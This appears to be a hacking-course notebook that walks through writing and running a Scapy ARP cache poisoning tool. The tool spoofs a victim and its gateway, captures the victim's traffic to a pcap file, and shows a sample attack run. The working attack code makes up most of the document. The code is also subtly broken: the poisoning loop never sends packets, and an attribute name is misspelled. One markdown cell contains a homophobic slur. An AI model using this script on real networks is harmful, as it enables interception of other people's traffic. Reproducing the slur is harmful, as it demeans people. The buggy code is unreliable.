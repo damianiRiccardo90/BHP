{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyPpYUFmbcUSn9nU5gE/nsLg",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/damianiRiccardo90/BHP/blob/master/C3-Owning_The_Network_With_Scapy/ARP_Cache_Poisoning.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [],
      "metadata": {
        "id": "MHego-pA4Si8"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "# *__ARP Cache Poisoning with Scapy__*\n",
        "\n",
        "ARP poisoning is one of the oldest yet most effective tricks in a hacker's toolkit. Quite simply, we will convince a target machine that we have become its gateway, and we will also convince the gateway that in order to reach the target machine, all traffic has to go through us. Every computer on a network maintains an __ARP cache__ that stores the most recent media access control (__MAC__) addresses matching the IP addresses on the local network. We'll poison this cache with entries that we control to achieve this attack. Because the Address Resolution Protocol, and ARP poisoning in general, is covered in numerous other materials, we'll leave it to you to do any necessary research to understand how this attack works at a lower level.\n",
        "\n",
        "Now that we know what we need to do, let's put it into practice. When the authors tested this, we attacked a real Mac machine from a Kali VM. We have also tested this code against various mobile devices connected to a wireless access point, and it worked great. The first thing we'll do is check the ARP cache on the target Mac machine so we can see the attack in action later on. Examine the following to see how to inspect the ARP cache on your Mac:\n",
        "```\n",
        "MacBook-Pro-Merd:~ victim$ ifconfig en0\n",
        "en0: flags=8863<UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST> mtu 1500\n",
        "ether 38:f9:d3:63:5c:48\n",
        "inet6 fe80::4bc:91d7:29ee:51d8%en0 prefixlen 64 secured scopeid 0x6\n",
        "inet 192.168.1.193 netmask 0xffffff00 broadcast 192.168.1.255\n",
        "inet6 2600:1700:c1a0:6ee0:1844:8b1c:7fe0:79c8 prefixlen 64 autoconf secured\n",
        "inet6 2600:1700:c1a0:6ee0:fc47:7c52:affd:f1f6 prefixlen 64 autoconf temporary\n",
        "inet6 2600:1700:c1a0:6ee0::31 prefixlen 64 dynamic\n",
        "nd6 options=201<PERFORMNUD,DAD>\n",
        "media: autoselect\n",
        "status: active\n",
        "```\n",
        "The _ifconfig_ command displays the network configuration for the specified interface (here, it's _en0_) or for all interfaces if you don't specify one. The output shows that the _inet_ (IPv4) address for the device is 192.168.1.193. Also listed are the MAC address (38:f9:d3:63:5c:48, labeled as _ether_) and a few IPv6 addresses. ARP poisoning works only for IPv4 addresses, so we'll ignore the IPv6 ones.\n",
        "\n",
        "Now let's see what the Mac has in its ARP address cache. The following shows what it thinks the MAC addresses are for its neighbors on the network:\n",
        "```\n",
        "MacBook-Pro-Merd:~ victim$ arp -a\n",
        "kali.attlocal.net (192.168.1.203) at a4:5e:60:ee:17:5d on en0 ifscope #[1]\n",
        "dsldevice.attlocal.net (192.168.1.254) at 20:e5:64:c0:76:d0 on en0 ifscope #[2]\n",
        "? (192.168.1.255) at ff:ff:ff:ff:ff:ff on en0 ifscope [ethernet]\n",
        "```\n",
        "We can see that the IP address of the Kali machine belonging to the attacker __[1]__ is 192.168.1.203 and its MAC address is a4:5e:60:ee:17:5d. The gateway connects both attacker and victim machines to the internet. Its IP address __[2]__ is at 192.168.1.254 and its associated ARP cache entry has a MAC address of 20:e5:64:c0:76:d0. We will take note of these values because we can view the ARP cache while the attack is occurring and see that we have changed the gateway's registered MAC address. Now that we know the gateway and the target IP address, let's begin coding the ARP poisoning script. Open a new Python file, call it _arper.py_, and enter the following code. We'll start by stubbing out the skeleton of the file to give you a sense of how we'll construct the poisoner:"
      ],
      "metadata": {
        "id": "-ktx6tJh4UUY"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "from multiprocessing import Process\n",
        "from scapy.all import (ARP, Ether, conf, get_if_hwaddr, \n",
        "                       send, sniff, sndrcv, srp,wrpcap)\n",
        "import os\n",
        "import sys\n",
        "import time\n",
        "\n",
        "def get_mac(targetip): #[1]\n",
        "    pass\n",
        "\n",
        "class Arper:\n",
        "    def __init__(self, victim, gateway, interface=\"en0\"):\n",
        "        pass\n",
        "    \n",
        "    def run(self):\n",
        "        pass\n",
        "\n",
        "    def poison(self): #[2]\n",
        "        pass\n",
        "    \n",
        "    def sniff(self, count=100): #[3]\n",
        "        pass\n",
        "\n",
        "    def restore(self): #[4]\n",
        "        pass\n",
        "\n",
        "if __name__ == \"__main__\":\n",
        "    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])\n",
        "    myarp = Arper(victim, gateway, interface)\n",
        "    myarp.run()"
      ],
      "metadata": {
        "id": "a5hh0Pz0ippn"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "As you can see, we'll define a helper function to get the MAC address for any given machine __[1]__ and an __Arper__ class to _poison_ __[2]__, _sniff_ __[3]__, and _restore_ __[4]__ the network settings. Let's fill out each section, starting with the _get_mac_ function, which returns a MAC address for a given IP address. We need the MAC addresses of the victim and the gateway."
      ],
      "metadata": {
        "id": "Ccj3wuoZjny9"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "def get_mac(targetip):\n",
        "    packet = Ether(dst=\"ff:ff:ff:ff:ff:ff\")/ARP(op=\"who-has\", pdst=targetip) #[1]\n",
        "    resp, _ = srp(packet, timeout=2, retry=10, verbose=False) #[2]\n",
        "    for _, r in resp:\n",
        "        return r[Ether].src\n",
        "    return None"
      ],
      "metadata": {
        "id": "0qCkyBzNkOqC"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "We pass in the target IP address and create a packet __[1]__. The __Ether__ function specifies that this packet is to be broadcast, and the __ARP__ function specifies the request for the MAC address, asking each node whether it has the target IP. We send the packet with the Scapy function __srp__ __[2]__, which sends and receives a packet on network layer 2. We get the answer in the __resp__ variable, which should contain the Ether layer source (the MAC address) for the target IP.\n",
        "\n",
        "Next, let's begin writing the __Arper__ class:"
      ],
      "metadata": {
        "id": "6JX_G_FNlRKT"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "class Arper():\n",
        "    def __init__(self, victim, gateway, interface=\"en0\"):\n",
        "        self.victim = victim\n",
        "        self.victimmac = get_mac(victim)\n",
        "        self.gateway = gateway\n",
        "        self.gatewaymac = get_mac(gateway)\n",
        "        self.inteface = interface\n",
        "        conf.iface = interface\n",
        "        conf.verb = 0\n",
        "\n",
        "        print(f\"Initialized {interface}:\")\n",
        "        print(f\"Gateway ({gateway}) is at {self.gatewaymac}.\")\n",
        "        print(f\"Victim ({victim}) is at {self.victimmac}.\")\n",
        "        print('-' * 30)"
      ],
      "metadata": {
        "id": "__E4kTd4OSA_"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "We intialize the class with the victim and gateway IPs and specify the interface to use (_en0_ is the default) __[1]__. With this info, we populate the object variables __interface__, __victim__, __victimmac__, __gateway__, and __gatewaymac__, printing the values to the console __[2]__.\n",
        "\n",
        "Within the __Arper__ class we write the __run__ function, which is the entry point for the attack:"
      ],
      "metadata": {
        "id": "OjppPVV0QUu2"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "class Arper():\n",
        "    def run(self):\n",
        "        self.poison_thread = Process(target=self.poison) #[1]\n",
        "        self.poison_thread.start()\n",
        "\n",
        "        self.sniff_thread = Process(target=self.sniff) #[2]\n",
        "        self.sniff_thread.start()"
      ],
      "metadata": {
        "id": "OOvVgedhRXsM"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "The __run__ method performs the main work of the __Arper__ object. It sets up and runs two processes one to poison the ARP cache __[1]__ and another so we can watch the attack in progress by sniffing the network traffic __[2]__.\n",
        "\n",
        "The __poison__ method creates the poisoned packets and sends them to the victim and the gateway."
      ],
      "metadata": {
        "id": "XRSmI3LbS04D"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "class Arper():\n",
        "    def poison(self):\n",
        "        poison_victim = ARP() #[1]\n",
        "        poison_victim.op = 2\n",
        "        poison_victim.psrc = self.gateway\n",
        "        poison_victim.pdst = self.victim\n",
        "        poison_victim.hwdst = self.victimmac\n",
        "        print(f\"ip src: {poison_victim.psrc}\")\n",
        "        print(f\"ip dst: {poison_victim.pdst}\")\n",
        "        print(f\"mac dst: {poison_victim.hwdst}\")\n",
        "        print(f\"mac src: {poison_victim.hwsrc}\")\n",
        "        print(poison_victim.summary())\n",
        "        print('-' * 30)\n",
        "        poison_gateway = ARP() #[2]\n",
        "        poison_gateway.op = 2\n",
        "        poison_gateway.psrc = self.victim\n",
        "        poison_gateway.pdst = self.gateway\n",
        "        poison_gateway.hwdst = self.gatewaymac\n",
        "\n",
        "        print(f\"ip src: {poison_gateway.psrc}\")\n",
        "        print(f\"ip dst: {poison_gateway.pdst}\")\n",
        "        print(f\"mac dst: {poison_gateway.hwdst}\")\n",
        "        print(f\"mac src: {poison_gateway.hwsrc}\")\n",
        "        print(poison_gateway.summary())\n",
        "        print('-' * 30)\n",
        "        print(f\"Beginning the ARP poison. [CTRL-C to stop]\")\n",
        "        while True: #[3]\n",
        "            sys.stdout.write('.')\n",
        "            sys.stdout.flush()\n",
        "        try:\n",
        "            send(poison_victim)\n",
        "            send(poison_gateway)\n",
        "        except KeyboardInterrupt: #[4]\n",
        "            self.restore()\n",
        "            sys.exit()\n",
        "        else:\n",
        "            time.sleep(2)"
      ],
      "metadata": {
        "id": "KwoXk2eaT-iW"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "The __poison__ method sets up the data we'll use to poison the victim and the gateway. First, we create a poisoned ARP packet intended for the victim __[1]__. Likewise, we create a poisoned ARP packet for the gateway __[2]__. We poison the gateway by sending it the victim's IP address but the attacker's MAC address. Likewise, we poison the victim by sending it the gateway's IP address but the attacker's MAC address. We print all of this information to the console so we can be sure of our packet's destinations and payloads.\n",
        "\n",
        "Next, we start sending the poisoned packets to their destinations in an infinite loop to make sure that the respective ARP cache entries remain poisoned for the duration of the attack __[3]__. The loop will continue until you press CTRL-C (_KeyboardInterrupt_) __[4]__, in which case we restore things to normal (by sending the correct information to the victim and the gateway, undoing our poisoning attack).\n",
        "\n",
        "In order to see and record the attack as it happens, we sniff the network traffic with the __sniff__ method:"
      ],
      "metadata": {
        "id": "-NQGbQKFLhLq"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "class Arper():\n",
        "    def sniff(self, count=100):\n",
        "        time.sleep(5) #[1]\n",
        "        print(f\"Sniffing {count} packets\")\n",
        "        bpf_filter = \"ip host %s\" % self.victim #[2]\n",
        "        packets = sniff(count=count, filter=bpf_filter, iface=self.interface) #[3]\n",
        "        wrpcap(\"arper.pcap\", packets) #[4]\n",
        "        print(\"Got the packets\")\n",
        "        self.restore() #[5]\n",
        "        self.poison_thread.terminate()\n",
        "        print(\"Finished.\")"
      ],
      "metadata": {
        "id": "-rsYHianQ1uQ"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "The __sniff__ method sleeps for five seconds __[1]__ before it starts sniffing in order to give th poisoning thread time to start working. It sniffs for a number of packets (100 by default) __[3]__, filtering for packets that have the victim's IP __[2]__. Once we've captured the packets, we write them to a file called _arper.pcap_ __[4]__, restore the ARP tables to their original values __[5]__, and terminate the poison thread.\n",
        "\n",
        "Finally, the __restore__ method puts the victim and gateway machines back to their original state by sending correct ARP information to each machine:"
      ],
      "metadata": {
        "id": "Mm-CVuj5Sjnu"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "class Arper():\n",
        "    def restore(self):\n",
        "        print(\"Restoring ARP tables...\")\n",
        "\n",
        "        packet_for_victim = ARP(\n",
        "            op=2,\n",
        "            psrc=self.gateway,\n",
        "            hwsrc=self.gatewaymac,\n",
        "            pdst=self.victim,\n",
        "            hwdst=\"ff:ff:ff:ff:ff:ff\"\n",
        "        )\n",
        "        send(packet_for_victim, count=5) #[1]\n",
        "\n",
        "        packet_for_gateway = ARP(\n",
        "            op=2,\n",
        "            psrc=self.victim,\n",
        "            hwsrc=self.victimmac,\n",
        "            pdst=self.gateway,\n",
        "            hwdst=\"ff:ff:ff:ff:ff:ff\"\n",
        "        )\n",
        "        send(packet_for_gateway, count=5) #[2]"
      ],
      "metadata": {
        "id": "tsJ3bweQTlD3"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "The __restore__ method could be called from either the __poison__ method (if you hit CTRL-C) or the __sniff__ method (when the specified number of packets have been captured). It sends the original values for the gateway IP and MAC addresses to the victim __[1]__, and it sends the original values for the victim's IP and MAC to the gateway __[2]__.\n",
        "Let's take this bad boy for a spin!"
      ],
      "metadata": {
        "id": "aKm5UX4LVKKZ"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "# *__Kicking the Tires__*\n",
        "\n",
        "Before we begin, we need to first tell the local host machine that we can forward packets along to both the gateway and the target IP address. If you are on your Kali VM, enter the following command into your terminal:\n",
        "```\n",
        "#:> echo 1 > /proc/sys/net/ipv4/ip_forward\n",
        "```\n",
        "If you are an __Apple faggit__, use the following command:\n",
        "```\n",
        "#:> sudo sysctl -w net.inet.ip.forwarding=1\n",
        "```\n",
        "Now that we have IP forwarding in place, let's fire up the script and check the ARP cache of the target machine. From your attacking machine, run the following (as root):\n",
        "```\n",
        "#:> python arper.py 192.168.1.193 192.168.1.254 en0\n",
        "Initialized en0:\n",
        "Gateway (192.168.1.254) is at 20:e5:64:c0:76:d0.\n",
        "Victim (192.168.1.193) is at 38:f9:d3:63:5c:48.\n",
        "------------------------------\n",
        "ip src: 192.168.1.254\n",
        "ip dst: 192.168.1.193\n",
        "mac dst: 38:f9:d3:63:5c:48\n",
        "mac src: a4:5e:60:ee:17:5d\n",
        "ARP is at a4:5e:60:ee:17:5d says 192.168.1.254\n",
        "------------------------------\n",
        "ip src: 192.168.1.193\n",
        "ip dst: 192.168.1.254\n",
        "mac dst: 20:e5:64:c0:76:d0\n",
        "mac src: a4:5e:60:ee:17:5d\n",
        "ARP is at a4:5e:60:ee:17:5d says 192.168.1.193\n",
        "------------------------------\n",
        "Beginning the ARP poison. [CTRL-C to stop]\n",
        "...Sniffing 100 packets\n",
        "......Got the packets\n",
        "Restoring ARP tables...\n",
        "Finished.\n",
        "```\n",
        "Awesome! No error or other weirdness. Now let's validate the attack on the target machine. While the script was in the process of capturing the 100 packets, we displayed the ARP table on the victim device with the __arp__ command:\n",
        "```\n",
        "MacBook-Pro:~ victim$ arp -a\n",
        "kali.attlocal.net (192.168.1.203) at a4:5e:60:ee:17:5d on en0 ifscope\n",
        "dsldevice.attlocal.net (192.168.1.254) at a4:5e:60:ee:17:5d on en0 ifscope\n",
        "```\n",
        "You can now see that the poor victim has a poisoned ARP cache, whereas the gateway now has the same MAC address as the attacking computer. You can clearly see in the entry above the gateway that we're attacking from 192.168.1.203. When the attack has finished capturing packets, you should see an __arper.pcap__ file in the same directory as your script. You can, of course, do things such as force the target computer to proxy all of its traffic through a local instance of Burp or do any number of other nasty things. You might want to hang on to that pcap file for the next section on pcap processing, you never know what you might find!"
      ],
      "metadata": {
        "id": "zuKCeuGFV5Ht"
      }
    }
  ]
}